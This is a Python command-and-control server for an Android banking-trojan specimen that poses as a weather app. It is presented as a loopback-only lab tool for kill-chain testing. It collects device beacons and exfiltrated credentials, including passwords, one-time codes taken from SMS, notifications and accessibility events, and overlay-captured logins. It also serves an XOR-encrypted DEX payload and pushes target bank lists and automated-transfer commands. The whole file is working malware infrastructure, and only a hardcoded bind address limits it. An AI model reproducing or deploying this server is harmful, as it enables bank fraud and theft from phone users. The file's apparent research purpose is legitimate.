#!/usr/bin/env python3
"""
Lab C2 Server — SkyWeather Forecast Specimen

Loopback-only C2 server for end-to-end kill chain testing.
Implements all endpoints the specimen expects:

  POST /api/v1/beacon    — receive device fingerprint + credential exfil
  GET  /api/v1/payload   — serve XOR-encrypted DEX payload
  GET  /api/v1/config    — serve config (target list, ATS commands, kill switch)

SAFETY:
  - Binds 127.0.0.1 ONLY (hardcoded, not configurable)
  - No TLS (lab loopback doesn't need it)
  - All received credentials logged to console + credentials.jsonl
  - Payload must be manually staged (no auto-generation)

Usage:
  python server.py                          # default: port 8080
  python server.py --port 8080              # explicit port
  python server.py --payload path/to.dex    # stage encrypted payload
  python server.py --targets "com.dvbank.example,com.test.app"
  python server.py --ats-file ats-commands.json

Emulator note:
  Android emulator reaches host via 10.0.2.2.
  Specimen connects to http://10.0.2.2:8080/api/v1/beacon.
  This server on 127.0.0.1:8080 receives that traffic.
"""

import argparse
import io
import json
import os
import sys
import time
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

# Force UTF-8 stdout on Windows (emoji in log output)
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ── Global state ──────────────────────────────────────────────────

devices = {}          # device_id → {model, sdk, first_seen, last_seen, beacon_count}
credentials = []      # all captured credential events
config = {
    "kill": False,
    "interval": 900000,
    "target_list": "",
    "payload_url": "",
    "ats_commands": []
}
payload_bytes = None   # XOR-encrypted DEX bytes (None = 404 on /payload)
xor_key = b"SkyWeatherSync24"  # must match AppConfig.PAYLOAD_KEY

# Credential log file
cred_log_path = None


# ── XOR encryption (matches PayloadManager.decrypt) ──────────────

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt/decrypt with rotating key. Symmetric — same op for both."""
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % len(key)]
    return bytes(result)


def stage_payload(dex_path: str) -> bytes:
    """Read a file and prepare it for serving.

    Two modes:
      - If file starts with DEX magic: treat as raw DEX, XOR-encrypt it
      - If file doesn't start with DEX magic: treat as pre-encrypted
        (output of generate-test-payload.py --stub)
    """
    raw = Path(dex_path).read_bytes()
    if raw[:3] == b'dex':
        # Raw DEX -- encrypt for delivery
        encrypted = xor_encrypt(raw, xor_key)
        print(f"[+] Payload staged: {len(raw)} bytes raw DEX, encrypted for delivery")
        return encrypted
    else:
        # Already encrypted (from generate-test-payload.py)
        # Verify it decrypts to DEX
        decrypted = xor_encrypt(raw, xor_key)
        if decrypted[:3] == b'dex':
            print(f"[+] Payload staged: {len(raw)} bytes pre-encrypted, DEX magic verified")
        else:
            print(f"[!] WARNING: {dex_path} neither raw DEX nor valid encrypted DEX")
            print(f"    First 4 bytes: {raw[:4].hex()}")
            print(f"    Decrypted first 4: {decrypted[:4].hex()}")
        return raw


# ── Request handler ───────────────────────────────────────────────

class C2Handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        """Override default logging — use our format."""
        pass  # suppress default, we log manually

    def _ts(self):
        return datetime.now(timezone.utc).strftime("%H:%M:%S")

    def _send_json(self, code: int, data: dict):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_bytes(self, code: int, data: bytes, content_type: str = "application/octet-stream"):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length", 0))
        if length <= 0:
            return b""
        return self.rfile.read(length)

    # ── POST /api/v1/beacon ───────────────────────────────────────

    def _handle_beacon(self):
        body = self._read_body()
        if not body:
            self._send_json(400, {"error": "empty body"})
            return

        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self._send_json(400, {"error": "invalid json"})
            return

        # Credential exfil: {"c": [...]}
        if "c" in data:
            self._handle_credential_exfil(data)
            return

        # Device beacon: {"m": "model", "s": sdk, "t": timestamp}
        model = data.get("m", "unknown")
        sdk = data.get("s", 0)
        ts = data.get("t", 0)
        device_id = f"{model}_{sdk}"

        if device_id not in devices:
            devices[device_id] = {
                "model": model,
                "sdk": sdk,
                "first_seen": time.time(),
                "last_seen": time.time(),
                "beacon_count": 1
            }
            print(f"[{self._ts()}] 🆕 NEW DEVICE: {model} (SDK {sdk})")
        else:
            devices[device_id]["last_seen"] = time.time()
            devices[device_id]["beacon_count"] += 1
            count = devices[device_id]["beacon_count"]
            print(f"[{self._ts()}] 📡 BEACON #{count}: {model} (SDK {sdk})")

        self._send_json(200, {"status": "ok", "ts": int(time.time())})

    def _handle_credential_exfil(self, data: dict):
        events = data.get("c", [])
        if not events:
            self._send_json(200, {"status": "ok", "captured": 0})
            return

        print(f"\n[{self._ts()}] {'='*60}")
        print(f"[{self._ts()}] 🔑 CREDENTIAL EXFIL — {len(events)} events")
        print(f"[{self._ts()}] {'='*60}")

        for event in events:
            pkg = event.get("p", "?")
            vid = event.get("v", "?")
            text = event.get("x", "?")
            ets = event.get("t", 0)
            etype = event.get("e", "?")

            # Color-code by event type
            icon = {
                "pwd": "🔒",
                "usr": "👤",
                "otp": "🔢", "otp_sms": "📱", "otp_nls": "🔔", "otp_a11y": "♿",
                "overlay_usr": "🎭👤", "overlay_pwd": "🎭🔒",
                "ats_complete": "✅", "ats_abort": "❌", "ats_read": "📖",
                "fg": "📱", "foc": "🎯",
                "sms_raw": "📨", "sms_ctx": "📨",
                "nls_ctx": "🔔",
                "txt": "📝"
            }.get(etype, "❓")

            ts_str = datetime.fromtimestamp(ets / 1000, tz=timezone.utc).strftime("%H:%M:%S") if ets else "?"
            print(f"  {icon} [{etype:>12}] {pkg} → {vid}: {text}")

            # Store
            credentials.append(event)

            # Log to file
            if cred_log_path:
                with open(cred_log_path, "a") as f:
                    f.write(json.dumps(event) + "\n")

        print(f"[{self._ts()}] {'='*60}")
        print(f"[{self._ts()}] Total captured: {len(credentials)} events\n")

        self._send_json(200, {"status": "ok", "captured": len(events)})

    # ── GET /api/v1/payload ───────────────────────────────────────

    def _handle_payload(self):
        if payload_bytes is None:
            print(f"[{self._ts()}] 📦 PAYLOAD request — nothing staged (404)")
            self._send_json(404, {"error": "no payload staged"})
            return

        print(f"[{self._ts()}] 📦 PAYLOAD delivered — {len(payload_bytes)} bytes")
        self._send_bytes(200, payload_bytes)

    # ── GET /api/v1/config ────────────────────────────────────────

    def _handle_config(self):
        response = {
            "kill": config["kill"],
            "interval": config["interval"],
        }

        if config["target_list"]:
            response["target_list"] = config["target_list"]

        if config["payload_url"]:
            response["payload_url"] = config["payload_url"]

        if config["ats_commands"]:
            response["ats_commands"] = config["ats_commands"]

        targets = config["target_list"] or "(none)"
        ats_count = len(config["ats_commands"]) if config["ats_commands"] else 0
        print(f"[{self._ts()}] ⚙️  CONFIG served — targets: {targets}, ATS commands: {ats_count}")
        self._send_json(200, response)

    # ── Route dispatch ────────────────────────────────────────────

    def do_POST(self):
        if self.path == "/api/v1/beacon":
            self._handle_beacon()
        else:
            self._send_json(404, {"error": "not found"})

    def do_GET(self):
        if self.path == "/api/v1/payload":
            self._handle_payload()
        elif self.path == "/api/v1/config" or self.path == "/config":
            self._handle_config()
        elif self.path == "/status":
            self._handle_status()
        elif self.path == "/credentials":
            self._handle_cred_dump()
        else:
            self._send_json(404, {"error": "not found"})

    # ── Operator endpoints ────────────────────────────────────────

    def _handle_status(self):
        """Operator dashboard — device inventory + credential count."""
        self._send_json(200, {
            "devices": devices,
            "credential_count": len(credentials),
            "config": config,
            "payload_staged": payload_bytes is not None,
            "uptime_s": int(time.time() - start_time)
        })

    def _handle_cred_dump(self):
        """Dump all captured credentials."""
        self._send_json(200, {"credentials": credentials})


# ── Main ──────────────────────────────────────────────────────────

start_time = time.time()


def main():
    global payload_bytes, config, cred_log_path

    parser = argparse.ArgumentParser(
        description="Lab C2 Server — SkyWeather Forecast Specimen",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python server.py                                    # Basic C2, port 8080
  python server.py --targets "com.dvbank.example"     # Push target list
  python server.py --payload sample.dex               # Stage encrypted DEX
  python server.py --ats-file ats-transfer.json       # Stage ATS commands

Operator endpoints (browser):
  http://127.0.0.1:8080/status        Device inventory + stats
  http://127.0.0.1:8080/credentials   Dump all captured credentials
        """
    )
    parser.add_argument("--port", type=int, default=8080, help="Listen port (default: 8080)")
    parser.add_argument("--payload", type=str, help="Path to DEX file to stage (will be XOR-encrypted)")
    parser.add_argument("--targets", type=str, help="Comma-separated target package names")
    parser.add_argument("--ats-file", type=str, help="Path to ATS command JSON file")
    parser.add_argument("--kill", action="store_true", help="Set kill switch (specimen will self-disable)")
    parser.add_argument("--log-dir", type=str, default=".", help="Directory for credential log file")

    args = parser.parse_args()

    # Credential log
    log_dir = Path(args.log_dir)
    log_dir.mkdir(parents=True, exist_ok=True)
    cred_log_path = str(log_dir / "credentials.jsonl")

    # Stage payload
    if args.payload:
        if not os.path.exists(args.payload):
            print(f"[!] Payload file not found: {args.payload}")
            sys.exit(1)
        payload_bytes = stage_payload(args.payload)

    # Config
    if args.targets:
        config["target_list"] = args.targets
    if args.kill:
        config["kill"] = True
    if args.ats_file:
        if not os.path.exists(args.ats_file):
            print(f"[!] ATS file not found: {args.ats_file}")
            sys.exit(1)
        with open(args.ats_file) as f:
            config["ats_commands"] = json.load(f)

    # Banner
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print("║  SkyWeather Forecast — Lab C2 Server                    ║")
    print("║  LOOPBACK ONLY — 127.0.0.1 (emulator: 10.0.2.2)       ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print(f"║  Port:      {args.port:<44}║")
    print(f"║  Payload:   {'STAGED (' + str(len(payload_bytes)) + ' bytes)' if payload_bytes else 'None (404 on /payload)':<44}║")
    print(f"║  Targets:   {config['target_list'] or '(none — specimen monitors all)':<44}║")
    ats_n = len(config['ats_commands']) if config['ats_commands'] else 0
    print(f"║  ATS cmds:  {str(ats_n) + ' commands loaded' if ats_n else '(none)':<44}║")
    print(f"║  Kill:      {str(config['kill']):<44}║")
    print(f"║  Cred log:  {cred_log_path:<44}║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║  Endpoints:                                             ║")
    print("║    POST /api/v1/beacon    Fingerprint + credential exfil║")
    print("║    GET  /api/v1/payload   Encrypted DEX delivery        ║")
    print("║    GET  /api/v1/config    Config (targets, ATS, kill)   ║")
    print("║    GET  /status           Operator dashboard            ║")
    print("║    GET  /credentials      Dump captured credentials     ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print()
    print(f"[*] Listening on 127.0.0.1:{args.port} ...")
    print(f"[*] Specimen connects via http://10.0.2.2:{args.port}/api/v1/beacon")
    print()

    # SAFETY: bind to 127.0.0.1 ONLY — hardcoded, not configurable
    server = HTTPServer(("127.0.0.1", args.port), C2Handler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] Shutting down. Captured {len(credentials)} credential events total.")
        if credentials and cred_log_path:
            print(f"[*] Credentials saved to: {cred_log_path}")
        server.server_close()


if __name__ == "__main__":
    main()
